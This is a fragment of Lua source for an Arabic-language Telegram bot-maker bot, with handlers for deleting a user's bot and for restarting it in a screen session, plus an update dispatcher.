if redis:get(bot_id..":Bot:"..msg.sender.user_id) then
redis:set(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id,'true')
return bot.sendText(msg.chat_id,msg.id,'*⁉️꒐ هل انت متأكد من حذف بوتك .؟*', 'md', false, false, false, false, reply_markuk)
else
return bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ عذرا لا تمتلك بوت بالفعل .*', 'md', false, false, false, false, reply_markun)
end
end
if text == 'عمل رن ⚙' then
if redis:get(bot_id..":Bot:"..msg.sender.user_id) then
u , res = https.request('https://api.telegram.org/bot'..redis:get(bot_id..":Bot:"..msg.sender.user_id)..'/getMe')
JsonSInfo = JSON.decode(u)
useyu = string.upper(JsonSInfo['result']['username'])
os.execute('screen -S '..useyu..' -X kill')
os.execute('cd && cd '..useyu..';screen -d -m -S '..useyu..' lua5.3 start.lua')
return bot.sendText(msg.chat_id,msg.id,'*✅ ꒐تم تشغيل البوت بنجاح . .*', 'md')
else
return bot.sendText(msg.chat_id,msg.id,'⚠️꒐ عذرا لا تمتلك بوت لعمل رن .', 'md', false, false, false, false, reply_markun)
end
end
end --- end not devB(
end --- end type == "basicgroup"
end --- end Run(
----------------------------------------------------------------------------------------------------------------------------------------------------------------
function Call(data)
if data and data.luatele and data.luatele == "updateNewMessage" then
if data.message.sender.luatele == "messageSenderChat" then
return false
end
if tonumber(data.message.sender.user_id) ~= tonumber(bot_id) then  
print(serpent.block(data, {comment=false}))  
Run(data.message,data)
end
elseif data and data.luatele and data.luatele == "updateMessageEdited" then
local msg = bot.getMessage(data.chat_id, data.message_id)
if tonumber(msg.sender.user_id) ~= tonumber(bot_id) then  
Run(msg,data)
end
elseif data and data.luatele and data.luatele == "updateNewCallbackQuery" then
---Callback(data)
elseif data and data.luatele and data.luatele == "updateMessageSendSucceeded" then
end --- end data
end --- end Call( 
----------------------------------------------------------------------------------------------------------------------------------------------------------------
Runbot.run(Call)
